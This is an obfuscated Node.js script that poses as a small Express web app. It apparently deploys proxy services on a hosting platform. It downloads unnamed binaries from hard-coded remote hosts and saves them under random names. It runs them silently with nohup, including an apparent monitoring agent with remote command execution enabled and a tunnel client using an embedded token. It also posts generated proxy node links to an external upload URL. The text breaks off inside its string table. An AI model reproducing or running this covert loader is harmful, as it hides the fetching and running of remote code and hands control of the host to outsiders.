const _0x364ccd = _0x3229
;(function (_0x5a92c4, _0x527620) {
  const _0x266bac = _0x3229,
    _0x1ad9b4 = _0x5a92c4()
  while (!![]) {
    try {
      const _0x23d223 =
        -parseInt(_0x266bac(0x115)) / 0x1 +
        (parseInt(_0x266bac(0x18f)) / 0x2) * (parseInt(_0x266bac(0x16a)) / 0x3) +
        parseInt(_0x266bac(0x142)) / 0x4 +
        (parseInt(_0x266bac(0x180)) / 0x5) * (-parseInt(_0x266bac(0x10c)) / 0x6) +
        parseInt(_0x266bac(0x15c)) / 0x7 +
        (-parseInt(_0x266bac(0x147)) / 0x8) * (-parseInt(_0x266bac(0x125)) / 0x9) +
        -parseInt(_0x266bac(0x152)) / 0xa
      if (_0x23d223 === _0x527620) break
      else _0x1ad9b4['push'](_0x1ad9b4['shift']())
    } catch (_0x32d4f6) {
      _0x1ad9b4['push'](_0x1ad9b4['shift']())
    }
  }
})(_0x6a5f, 0xec702)
const express = require(_0x364ccd(0x129)),
  app = express(),
  axios = require(_0x364ccd(0x189)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x364ccd(0x17e)),
  { promisify } = require(_0x364ccd(0x183)),
  exec = promisify(require('child_process')[_0x364ccd(0x172)]),
  UPLOAD_URL = process[_0x364ccd(0x15d)][_0x364ccd(0x186)] || '',
  PROJECT_URL = process[_0x364ccd(0x15d)]['PROJECT_URL'] || '',
  AUTO_ACCESS = process[_0x364ccd(0x15d)][_0x364ccd(0x165)] || ![],
  FILE_PATH = process[_0x364ccd(0x15d)][_0x364ccd(0x14c)] || _0x364ccd(0x105),
  NEZHA_SERVER = process[_0x364ccd(0x15d)][_0x364ccd(0x15b)] || '',
  NEZHA_PORT = process[_0x364ccd(0x15d)]['NEZHA_PORT'] || '',
  NEZHA_KEY = process[_0x364ccd(0x15d)][_0x364ccd(0xed)] || '',
  UUID = process[_0x364ccd(0x15d)][_0x364ccd(0x161)] || _0x364ccd(0x19d),
  ARGO_AUTH =
    process[_0x364ccd(0x15d)][_0x364ccd(0x112)] ||
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
  ARGO_DOMAIN = process[_0x364ccd(0x15d)][_0x364ccd(0x10f)] || _0x364ccd(0x15f),
  ARGO_PORT = process[_0x364ccd(0x15d)][_0x364ccd(0x164)] || 0xe2e1,
  SUB_PATH = process[_0x364ccd(0x15d)][_0x364ccd(0x13e)] || _0x364ccd(0x13d),
  PORT = process[_0x364ccd(0x15d)]['SERVER_PORT'] || process['env'][_0x364ccd(0x13f)] || 0xbb8,
  NAME = process[_0x364ccd(0x15d)][_0x364ccd(0x12b)] || _0x364ccd(0x15e),
  CFIP = process[_0x364ccd(0x15d)][_0x364ccd(0x175)] || 'mfa.gov.ua',
  CFPORT = process[_0x364ccd(0x15d)][_0x364ccd(0x132)] || 0x1bb
!fs['existsSync'](FILE_PATH)
  ? (fs[_0x364ccd(0x196)](FILE_PATH), console[_0x364ccd(0x101)](FILE_PATH + '\x20is\x20created'))
  : console[_0x364ccd(0x101)](FILE_PATH + _0x364ccd(0x136))
function generateRandomName() {
  const _0x507098 = _0x364ccd,
    _0x150e07 = _0x507098(0x1a0)
  let _0x432700 = ''
  for (let _0x5ae862 = 0x0; _0x5ae862 < 0x6; _0x5ae862++) {
    _0x432700 += _0x150e07[_0x507098(0x155)](Math[_0x507098(0x134)](Math[_0x507098(0xe8)]() * _0x150e07[_0x507098(0x145)]))
  }
  return _0x432700
}
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x364ccd(0x16c)](FILE_PATH, npmName),
  phpPath = path[_0x364ccd(0x16c)](FILE_PATH, phpName),
  webPath = path['join'](FILE_PATH, webName),
  botPath = path['join'](FILE_PATH, botName),
  subPath = path[_0x364ccd(0x16c)](FILE_PATH, _0x364ccd(0x178)),
  listPath = path[_0x364ccd(0x16c)](FILE_PATH, 'list.txt'),
  bootLogPath = path['join'](FILE_PATH, _0x364ccd(0x116)),
  configPath = path[_0x364ccd(0x16c)](FILE_PATH, _0x364ccd(0xea))
function deleteNodes() {
  const _0x20f1a1 = _0x364ccd
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x20f1a1(0x109)](subPath)) return
    let _0x483a0d
    try {
      _0x483a0d = fs[_0x20f1a1(0x14d)](subPath, _0x20f1a1(0x184))
    } catch {
      return null
    }
    const _0x327513 = Buffer[_0x20f1a1(0x179)](_0x483a0d, _0x20f1a1(0x166))['toString'](_0x20f1a1(0x184)),
      _0x305eb9 = _0x327513[_0x20f1a1(0x10a)]('\x0a')[_0x20f1a1(0x119)]((_0x52a659) =>
        /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x20f1a1(0x10d)](_0x52a659)
      )
    if (_0x305eb9[_0x20f1a1(0x145)] === 0x0) return
    return (
      axios[_0x20f1a1(0x126)](UPLOAD_URL + _0x20f1a1(0xfe), JSON[_0x20f1a1(0xe5)]({ nodes: _0x305eb9 }), {
        headers: { 'Content-Type': _0x20f1a1(0x198) }
      })['catch']((_0x416a18) => {
        return null
      }),
      null
    )
  } catch (_0x553f36) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x1df680 = _0x364ccd
  try {
    const _0x59b74d = fs[_0x1df680(0x182)](FILE_PATH)
    _0x59b74d['forEach']((_0x44430f) => {
      const _0x280442 = _0x1df680,
        _0xc882fe = path[_0x280442(0x16c)](FILE_PATH, _0x44430f)
      try {
        const _0x38981e = fs['statSync'](_0xc882fe)
        _0x38981e['isFile']() && fs[_0x280442(0x102)](_0xc882fe)
      } catch (_0x2e9b16) {}
    })
  } catch (_0x32cb62) {}
}
async function generateConfig() {
  const _0x5768ed = _0x364ccd,
    _0x234fd9 = {
      log: { access: _0x5768ed(0x146), error: _0x5768ed(0x146), loglevel: _0x5768ed(0x194) },
      inbounds: [
        {
          port: ARGO_PORT,
          protocol: _0x5768ed(0x170),
          settings: {
            clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
            decryption: _0x5768ed(0x194),
            fallbacks: [
              { dest: 0xbb9 },
              { path: '/vless-argo', dest: 0xbba },
              { path: _0x5768ed(0x140), dest: 0xbbb },
              { path: _0x5768ed(0x151), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x5768ed(0x185) }
        },
        {
          port: 0xbb9,
          listen: _0x5768ed(0xe4),
          protocol: 'vless',
          settings: { clients: [{ id: UUID }], decryption: _0x5768ed(0x194) },
          streamSettings: { network: _0x5768ed(0x185), security: _0x5768ed(0x194) }
        },
        {
          port: 0xbba,
          listen: _0x5768ed(0xe4),
          protocol: _0x5768ed(0x170),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x5768ed(0x194) },
          streamSettings: { network: 'ws', security: _0x5768ed(0x194), wsSettings: { path: _0x5768ed(0x117) } },
          sniffing: { enabled: !![], destOverride: ['http', 'tls', _0x5768ed(0xe6)], metadataOnly: ![] }
        },
        {
          port: 0xbbb,
          listen: _0x5768ed(0xe4),
          protocol: _0x5768ed(0xeb),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x5768ed(0x140) } },
          sniffing: { enabled: !![], destOverride: [_0x5768ed(0xef), 'tls', 'quic'], metadataOnly: ![] }
        },
        {
          port: 0xbbc,
          listen: _0x5768ed(0xe4),
          protocol: _0x5768ed(0x131),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x5768ed(0x194), wsSettings: { path: '/trojan-argo' } },
          sniffing: { enabled: !![], destOverride: [_0x5768ed(0xef), _0x5768ed(0x19c), _0x5768ed(0xe6)], metadataOnly: ![] }
        }
      ],
      dns: { servers: ['https+local://8.8.8.8/dns-query'] },
      outbounds: [
        { protocol: _0x5768ed(0x11c), tag: 'direct' },
        { protocol: 'blackhole', tag: 'block' }
      ]
    }
  fs[_0x5768ed(0x133)](path[_0x5768ed(0x16c)](FILE_PATH, 'config.json'), JSON[_0x5768ed(0xe5)](_0x234fd9, null, 0x2))
}
function _0x3229(_0x262a34, _0x3cb78d) {
  const _0x6a5fcb = _0x6a5f()
  return (
    (_0x3229 = function (_0x322950, _0x44a55c) {
      _0x322950 = _0x322950 - 0xe2
      let _0x5c26f0 = _0x6a5fcb[_0x322950]
      return _0x5c26f0
    }),
    _0x3229(_0x262a34, _0x3cb78d)
  )
}
function getSystemArchitecture() {
  const _0x4724a7 = _0x364ccd,
    _0x107cfc = os['arch']()
  return _0x107cfc === _0x4724a7(0x122) || _0x107cfc === 'arm64' || _0x107cfc === _0x4724a7(0x13b) ? _0x4724a7(0x122) : _0x4724a7(0x160)
}
function downloadFile(_0x2b61f1, _0x30f45c, _0x3cf14a) {
  const _0x405fc8 = _0x2b61f1
  !fs['existsSync'](FILE_PATH) && fs['mkdirSync'](FILE_PATH, { recursive: !![] })
  const _0x413967 = fs['createWriteStream'](_0x405fc8)
  axios({ method: 'get', url: _0x30f45c, responseType: 'stream' })
    ['then']((_0x8d0a48) => {
      const _0x57640a = _0x3229
      ;(_0x8d0a48['data'][_0x57640a(0x11d)](_0x413967),
        _0x413967['on']('finish', () => {
          const _0x876eec = _0x57640a
          ;(_0x413967[_0x876eec(0x130)](),
            console[_0x876eec(0x101)](_0x876eec(0x11b) + path[_0x876eec(0x12a)](_0x405fc8) + _0x876eec(0x187)),
            _0x3cf14a(null, _0x405fc8))
        }),
        _0x413967['on'](_0x57640a(0xff), (_0x3f793d) => {
          const _0x423f1b = _0x57640a
          fs[_0x423f1b(0x171)](_0x405fc8, () => {})
          const _0x587295 = _0x423f1b(0x11b) + path[_0x423f1b(0x12a)](_0x405fc8) + _0x423f1b(0xee) + _0x3f793d[_0x423f1b(0xf8)]
          ;(console[_0x423f1b(0xff)](_0x587295), _0x3cf14a(_0x587295))
        }))
    })
    ['catch']((_0x31ede2) => {
      const _0x453d4a = _0x3229,
        _0x502ac1 = _0x453d4a(0x11b) + path[_0x453d4a(0x12a)](_0x405fc8) + _0x453d4a(0xee) + _0x31ede2[_0x453d4a(0xf8)]
      ;(console[_0x453d4a(0xff)](_0x502ac1), _0x3cf14a(_0x502ac1))
    })
}
async function downloadFilesAndRun() {
  const _0x648a9f = _0x364ccd,
    _0x3bb33f = getSystemArchitecture(),
    _0x43d7e8 = getFilesForArchitecture(_0x3bb33f)
  if (_0x43d7e8[_0x648a9f(0x145)] === 0x0) {
    console[_0x648a9f(0x101)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture')
    return
  }
  const _0x3332d2 = _0x43d7e8['map']((_0x55ae80) => {
    return new Promise((_0x2ff9e4, _0x25442d) => {
      const _0x3d0cc8 = _0x3229
      downloadFile(_0x55ae80[_0x3d0cc8(0x11f)], _0x55ae80[_0x3d0cc8(0x14a)], (_0x4f9b77, _0x89a26f) => {
        _0x4f9b77 ? _0x25442d(_0x4f9b77) : _0x2ff9e4(_0x89a26f)
      })
    })
  })
  try {
    await Promise['all'](_0x3332d2)
  } catch (_0x4e36bf) {
    console[_0x648a9f(0xff)](_0x648a9f(0xec), _0x4e36bf)
    return
  }
  function _0x2d755c(_0x49f941) {
    const _0x2c3da8 = _0x648a9f,
      _0x42bc8a = 0x1fd
    _0x49f941[_0x2c3da8(0x14b)]((_0x40cd5c) => {
      const _0x499d61 = _0x2c3da8
      fs[_0x499d61(0x109)](_0x40cd5c) &&
        fs[_0x499d61(0xfa)](_0x40cd5c, _0x42bc8a, (_0x1dd281) => {
          const _0x5ced49 = _0x499d61
          _0x1dd281
            ? console[_0x5ced49(0xff)](_0x5ced49(0x18d) + _0x40cd5c + ':\x20' + _0x1dd281)
            : console[_0x5ced49(0x101)](_0x5ced49(0xfc) + _0x40cd5c + ':\x20' + _0x42bc8a[_0x5ced49(0xf0)](0x8))
        })
    })
  }
  const _0x4def24 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x2d755c(_0x4def24)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x25afc3 = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER[_0x648a9f(0x10a)](':')[_0x648a9f(0x137)]() : '',
        _0x49f787 = new Set([_0x648a9f(0x159), _0x648a9f(0x157), _0x648a9f(0x12d), '2087', _0x648a9f(0x191), '2053']),
        _0x1562bb = _0x49f787[_0x648a9f(0x100)](_0x25afc3) ? _0x648a9f(0x19e) : 'false',
        _0x191dec =
          _0x648a9f(0x148) +
          NEZHA_KEY +
          _0x648a9f(0x154) +
          NEZHA_SERVER +
          '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20' +
          _0x1562bb +
          _0x648a9f(0x16e) +
          UUID
      fs[_0x648a9f(0x133)](path['join'](FILE_PATH, 'config.yaml'), _0x191dec)
      const _0x395e13 = _0x648a9f(0x17b) + phpPath + _0x648a9f(0xf2) + FILE_PATH + _0x648a9f(0x141)
      try {
        ;(await exec(_0x395e13),
          console[_0x648a9f(0x101)](phpName + _0x648a9f(0x177)),
          await new Promise((_0x38879d) => setTimeout(_0x38879d, 0x3e8)))
      } catch (_0x2649c0) {
        console[_0x648a9f(0xff)](_0x648a9f(0x15a) + _0x2649c0)
      }
    } else {
      let _0x4da103 = ''
      const _0x38bb03 = ['443', '8443', _0x648a9f(0x12d), _0x648a9f(0x176), '2083', _0x648a9f(0xf6)]
      _0x38bb03[_0x648a9f(0x12f)](NEZHA_PORT) && (_0x4da103 = '--tls')
      const _0x2f876a =
        'nohup\x20' +
        npmPath +
        _0x648a9f(0x174) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x648a9f(0x107) +
        NEZHA_KEY +
        '\x20' +
        _0x4da103 +
        _0x648a9f(0x17c)
      try {
        ;(await exec(_0x2f876a),
          console[_0x648a9f(0x101)](npmName + _0x648a9f(0x177)),
          await new Promise((_0x18e4c5) => setTimeout(_0x18e4c5, 0x3e8)))
      } catch (_0x2c6fc6) {
        console[_0x648a9f(0xff)](_0x648a9f(0x197) + _0x2c6fc6)
      }
    }
  } else console[_0x648a9f(0x101)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0xcaedcb = _0x648a9f(0x17b) + webPath + _0x648a9f(0x1a2) + FILE_PATH + _0x648a9f(0x19b)
  try {
    ;(await exec(_0xcaedcb), console[_0x648a9f(0x101)](webName + _0x648a9f(0x177)), await new Promise((_0x2d5a34) => setTimeout(_0x2d5a34, 0x3e8)))
  } catch (_0x9bec41) {
    console[_0x648a9f(0xff)](_0x648a9f(0x195) + _0x9bec41)
  }
  if (fs[_0x648a9f(0x109)](botPath)) {
    let _0x6cddfe
    if (ARGO_AUTH[_0x648a9f(0x158)](/^[A-Z0-9a-z=]{120,250}$/)) _0x6cddfe = _0x648a9f(0x108) + ARGO_AUTH
    else
      ARGO_AUTH[_0x648a9f(0x158)](/TunnelSecret/)
        ? (_0x6cddfe = _0x648a9f(0x10e) + FILE_PATH + _0x648a9f(0x193))
        : (_0x6cddfe = _0x648a9f(0x118) + FILE_PATH + '/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:' + ARGO_PORT)
    try {
      ;(await exec('nohup\x20' + botPath + '\x20' + _0x6cddfe + _0x648a9f(0xf4)),
        console[_0x648a9f(0x101)](botName + _0x648a9f(0x177)),
        await new Promise((_0x39784c) => setTimeout(_0x39784c, 0x7d0)))
    } catch (_0x4c23d8) {
      console[_0x648a9f(0xff)](_0x648a9f(0x153) + _0x4c23d8)
    }
  }
  await new Promise((_0x213a0c) => setTimeout(_0x213a0c, 0x1388))
}
function getFilesForArchitecture(_0x5b36ad) {
  const _0x5a6720 = _0x364ccd
  let _0x2a1ca1
  _0x5b36ad === 'arm'
    ? (_0x2a1ca1 = [
        { fileName: webPath, fileUrl: 'https://arm64.ssss.nyc.mn/web' },
        { fileName: botPath, fileUrl: _0x5a6720(0x12c) }
      ])
    : (_0x2a1ca1 = [
        { fileName: webPath, fileUrl: _0x5a6720(0x104) },
        { fileName: botPath, fileUrl: _0x5a6720(0x18c) }
      ])
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const _0x3fd296 = _0x5b36ad === _0x5a6720(0x122) ? 'https://arm64.ssss.nyc.mn/agent' : _0x5a6720(0x123)
      _0x2a1ca1['unshift']({ fileName: npmPath, fileUrl: _0x3fd296 })
    } else {
      const _0x3ab57a = _0x5b36ad === 'arm' ? _0x5a6720(0x173) : _0x5a6720(0x143)
      _0x2a1ca1[_0x5a6720(0x190)]({ fileName: phpPath, fileUrl: _0x3ab57a })
    }
  }
  return _0x2a1ca1
}
function argoType() {
  const _0x3fd8ab = _0x364ccd
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console['log'](_0x3fd8ab(0x156))
    return
  }
  if (ARGO_AUTH[_0x3fd8ab(0x12f)]('TunnelSecret')) {
    fs[_0x3fd8ab(0x133)](path[_0x3fd8ab(0x16c)](FILE_PATH, _0x3fd8ab(0x11e)), ARGO_AUTH)
    const _0x1a7a58 =
      _0x3fd8ab(0x135) +
      ARGO_AUTH[_0x3fd8ab(0x10a)]('\x22')[0xb] +
      _0x3fd8ab(0x16d) +
      path[_0x3fd8ab(0x16c)](FILE_PATH, 'tunnel.json') +
      _0x3fd8ab(0x16f) +
      ARGO_DOMAIN +
      _0x3fd8ab(0x111) +
      ARGO_PORT +
      _0x3fd8ab(0xf9)
    fs[_0x3fd8ab(0x133)](path[_0x3fd8ab(0x16c)](FILE_PATH, 'tunnel.yml'), _0x1a7a58)
  } else console[_0x3fd8ab(0x101)](_0x3fd8ab(0x11a))
}
async function extractDomains() {
  const _0x4f82b3 = _0x364ccd
  let _0x55a016
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x55a016 = ARGO_DOMAIN), console['log'](_0x4f82b3(0x163), _0x55a016), await _0xa72112(_0x55a016))
  else
    try {
      const _0x191f32 = fs[_0x4f82b3(0x14d)](path[_0x4f82b3(0x16c)](FILE_PATH, _0x4f82b3(0x116)), _0x4f82b3(0x184)),
        _0x4bf5cc = _0x191f32[_0x4f82b3(0x10a)]('\x0a'),
        _0x2d3fc0 = []
      _0x4bf5cc[_0x4f82b3(0x14b)]((_0x164929) => {
        const _0x1aa988 = _0x4f82b3,
          _0x5b8422 = _0x164929[_0x1aa988(0x158)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x5b8422) {
          const _0x3ca413 = _0x5b8422[0x1]
          _0x2d3fc0[_0x1aa988(0x139)](_0x3ca413)
        }
      })
      if (_0x2d3fc0[_0x4f82b3(0x145)] > 0x0)
        ((_0x55a016 = _0x2d3fc0[0x0]), console[_0x4f82b3(0x101)]('ArgoDomain:', _0x55a016), await _0xa72112(_0x55a016))
      else {
        ;(console[_0x4f82b3(0x101)](_0x4f82b3(0xe9)), fs['unlinkSync'](path['join'](FILE_PATH, _0x4f82b3(0x116))))
        async function _0x3718ae() {
          const _0x2e7f59 = _0x4f82b3
          try {
            process[_0x2e7f59(0x138)] === 'win32'
              ? await exec(_0x2e7f59(0x199) + botName + _0x2e7f59(0x127))
              : await exec(_0x2e7f59(0x106) + botName[_0x2e7f59(0x155)](0x0) + ']' + botName[_0x2e7f59(0xf5)](0x1) + '\x22\x20>\x20/dev/null\x202>&1')
          } catch (_0x2b47a8) {}
        }
        ;(_0x3718ae(), await new Promise((_0x326e9f) => setTimeout(_0x326e9f, 0xbb8)))
        const _0x22e03c = _0x4f82b3(0x118) + FILE_PATH + _0x4f82b3(0xe3) + ARGO_PORT
        try {
          ;(await exec('nohup\x20' + botPath + '\x20' + _0x22e03c + _0x4f82b3(0xf4)),
            console['log'](botName + _0x4f82b3(0x177)),
            await new Promise((_0x4eaf2a) => setTimeout(_0x4eaf2a, 0xbb8)),
            await extractDomains())
        } catch (_0x11b8c5) {
          console[_0x4f82b3(0xff)](_0x4f82b3(0x153) + _0x11b8c5)
        }
      }
    } catch (_0x1a243c) {
      console[_0x4f82b3(0xff)](_0x4f82b3(0x16b), _0x1a243c)
    }
  async function _0x5369d8() {
    const _0x2745cb = _0x4f82b3
    try {
      const _0x1f4971 = await axios[_0x2745cb(0xe2)](_0x2745cb(0x18b), { timeout: 0xbb8 })
      if (_0x1f4971[_0x2745cb(0x150)] && _0x1f4971[_0x2745cb(0x150)]['country_code'] && _0x1f4971[_0x2745cb(0x150)][_0x2745cb(0x17f)])
        return _0x1f4971[_0x2745cb(0x150)][_0x2745cb(0x14f)] + '_' + _0x1f4971['data'][_0x2745cb(0x17f)]
    } catch (_0x5d078e) {
      try {
        const _0x1cbdcd = await axios[_0x2745cb(0xe2)](_0x2745cb(0xfb), { timeout: 0xbb8 })
        if (
          _0x1cbdcd['data'] &&
          _0x1cbdcd[_0x2745cb(0x150)]['status'] === _0x2745cb(0x10b) &&
          _0x1cbdcd[_0x2745cb(0x150)][_0x2745cb(0x120)] &&
          _0x1cbdcd['data'][_0x2745cb(0x17f)]
        )
          return _0x1cbdcd['data'][_0x2745cb(0x120)] + '_' + _0x1cbdcd[_0x2745cb(0x150)][_0x2745cb(0x17f)]
      } catch (_0x18e73b) {}
    }
    return _0x2745cb(0x1a1)
  }
  async function _0xa72112(_0x1915d8) {
    const _0x9c00e7 = await _0x5369d8(),
      _0x338899 = NAME ? NAME + '-' + _0x9c00e7 : _0x9c00e7
    return new Promise((_0x45700e) => {
      setTimeout(() => {
        const _0x429e20 = _0x3229,
          _0x36d8d2 = {
            v: '2',
            ps: '' + _0x338899,
            add: CFIP,
            port: CFPORT,
            id: UUID,
            aid: '0',
            scy: _0x429e20(0x194),
            net: 'ws',
            type: _0x429e20(0x194),
            host: _0x1915d8,
            path: '/vmess-argo?ed=2560',
            tls: _0x429e20(0x19c),
            sni: _0x1915d8,
            alpn: '',
            fp: _0x429e20(0x103)
          },
          _0x53af23 =
            _0x429e20(0x167) +
            UUID +
            '@' +
            CFIP +
            ':' +
            CFPORT +
            '?encryption=none&security=tls&sni=' +
            _0x1915d8 +
            _0x429e20(0xfd) +
            _0x1915d8 +
            _0x429e20(0x188) +
            _0x338899 +
            _0x429e20(0x121) +
            Buffer[_0x429e20(0x179)](JSON[_0x429e20(0xe5)](_0x36d8d2))[_0x429e20(0xf0)]('base64') +
            '\x0a\x0atrojan://' +
            UUID +
            '@' +
            CFIP +
            ':' +
            CFPORT +
            _0x429e20(0x19a) +
            _0x1915d8 +
            _0x429e20(0xfd) +
            _0x1915d8 +
            _0x429e20(0x18a) +
            _0x338899 +
            _0x429e20(0x169)
        ;(console[_0x429e20(0x101)](Buffer[_0x429e20(0x179)](_0x53af23)[_0x429e20(0xf0)](_0x429e20(0x166))),
          fs[_0x429e20(0x133)](subPath, Buffer['from'](_0x53af23)['toString']('base64')),
          console[_0x429e20(0x101)](FILE_PATH + _0x429e20(0x19f)),
          uploadNodes(),
          app['get']('/' + SUB_PATH, (_0x3d6cc8, _0x694f2a) => {
            const _0x3d6035 = _0x429e20,
              _0x2fc4ae = Buffer[_0x3d6035(0x179)](_0x53af23)[_0x3d6035(0xf0)](_0x3d6035(0x166))
            ;(_0x694f2a[_0x3d6035(0xf7)](_0x3d6035(0xf3), _0x3d6035(0xf1)), _0x694f2a[_0x3d6035(0x14e)](_0x2fc4ae))
          }),
          _0x45700e(_0x53af23))
      }, 0x7d0)
    })
  }
}
async function uploadNodes() {
  const _0x1758fa = _0x364ccd
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x41f730 = PROJECT_URL + '/' + SUB_PATH,
      _0x5ca9a9 = { subscription: [_0x41f730] }
    try {
      const _0x5522eb = await axios[_0x1758fa(0x126)](UPLOAD_URL + '/api/add-subscriptions', _0x5ca9a9, {
        headers: { 'Content-Type': _0x1758fa(0x198) }
      })
      return _0x5522eb && _0x5522eb[_0x1758fa(0x181)] === 0xc8
        ? (console[_0x1758fa(0x101)]('Subscription\x20uploaded\x20successfully'), _0x5522eb)
        : null
    } catch (_0x273013) {
      if (_0x273013[_0x1758fa(0x149)]) {
        if (_0x273013[_0x1758fa(0x149)][_0x1758fa(0x181)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x1758fa(0x109)](listPath)) return
      const _0x20a0d3 = fs['readFileSync'](listPath, _0x1758fa(0x184)),
        _0x383b47 = _0x20a0d3['split']('\x0a')['filter']((_0x3dd710) => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1758fa(0x10d)](_0x3dd710))
      if (_0x383b47['length'] === 0x0) return
      const _0x451b82 = JSON[_0x1758fa(0xe5)]({ nodes: _0x383b47 })
      try {
        const _0x1b0fc6 = await axios[_0x1758fa(0x126)](UPLOAD_URL + _0x1758fa(0x162), _0x451b82, { headers: { 'Content-Type': 'application/json' } })
        return _0x1b0fc6 && _0x1b0fc6[_0x1758fa(0x181)] === 0xc8 ? (console[_0x1758fa(0x101)](_0x1758fa(0x110)), _0x1b0fc6) : null
      } catch (_0x2d0d72) {
        return null
      }
    } else return
  }
}
function _0x6a5f() {
  const _0xca97c = [
    'ARGO_DOMAIN',
    'Nodes\x20uploaded\x20successfully',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'ARGO_AUTH',
    'automatic\x20access\x20task\x20added\x20successfully',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    '1660033MIiSbQ',
    'boot.log',
    '/vless-argo',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20',
    'filter',
    'ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel',
    'Download\x20',
    'freedom',
    'pipe',
    'tunnel.json',
    'fileName',
    'countryCode',
    '\x0a\x0avmess://',
    'arm',
    'https://amd64.ssss.nyc.mn/agent',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    '9FMRIqL',
    'post',
    '.exe\x20>\x20nul\x202>&1',
    'utf8',
    'express',
    'basename',
    'NAME',
    'https://arm64.ssss.nyc.mn/bot',
    '2096',
    'readFile',
    'includes',
    'close',
    'trojan',
    'CFPORT',
    'writeFileSync',
    'floor',
    '\x0a\x20\x20tunnel:\x20',
    '\x20already\x20exists',
    'pop',
    'platform',
    'push',
    'http\x20server\x20is\x20running\x20on\x20port:',
    'aarch64',
    'rm\x20-rf\x20',
    '800',
    'SUB_PATH',
    'PORT',
    '/vmess-argo',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    '4054004gWyXwE',
    'https://amd64.ssss.nyc.mn/v1',
    '\x20>\x20nul\x202>&1',
    'length',
    '/dev/null',
    '9209752ZXGOZT',
    '\x0aclient_secret:\x20',
    'response',
    'fileUrl',
    'forEach',
    'FILE_PATH',
    'readFileSync',
    'send',
    'country_code',
    'data',
    '/trojan-argo',
    '7189850Ytftxa',
    'Error\x20executing\x20command:\x20',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    'charAt',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels',
    '8443',
    'match',
    '443',
    'php\x20running\x20error:\x20',
    'NEZHA_SERVER',
    '4769744iGvwtn',
    'env',
    'js-node',
    'deployzy.933993.xyz',
    'amd',
    'UUID',
    '/api/add-nodes',
    'ARGO_DOMAIN:',
    'ARGO_PORT',
    'AUTO_ACCESS',
    'base64',
    '\x0avless://',
    'del\x20/f\x20/q\x20',
    '\x0a\x20\x20\x20\x20',
    '5913uXfoCI',
    'Error\x20reading\x20boot.log:',
    'join',
    '\x0a\x20\x20credentials-file:\x20',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'vless',
    'unlink',
    'exec',
    'https://arm64.ssss.nyc.mn/v1',
    '\x20-s\x20',
    'CFIP',
    '2087',
    '\x20is\x20running',
    'sub.txt',
    'from',
    'catch',
    'nohup\x20',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'https://oooo.serv00.net/add-url',
    'path',
    'org',
    '115nJoIfy',
    'status',
    'readdirSync',
    'util',
    'utf-8',
    'tcp',
    'UPLOAD_URL',
    '\x20successfully',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'axios',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'https://ipapi.co/json',
    'https://amd64.ssss.nyc.mn/bot',
    'Empowerment\x20failed\x20for\x20',
    'Error\x20in\x20startserver:',
    '834GRkKWK',
    'unshift',
    '2083',
    'Unhandled\x20error\x20in\x20startserver:',
    '/tunnel.yml\x20run',
    'none',
    'web\x20running\x20error:\x20',
    'mkdirSync',
    'npm\x20running\x20error:\x20',
    'application/json',
    'taskkill\x20/f\x20/im\x20',
    '?security=tls&sni=',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'tls',
    '180233cd-22c9-4144-a559-012e45986dd6',
    'true',
    '/sub.txt\x20saved\x20successfully',
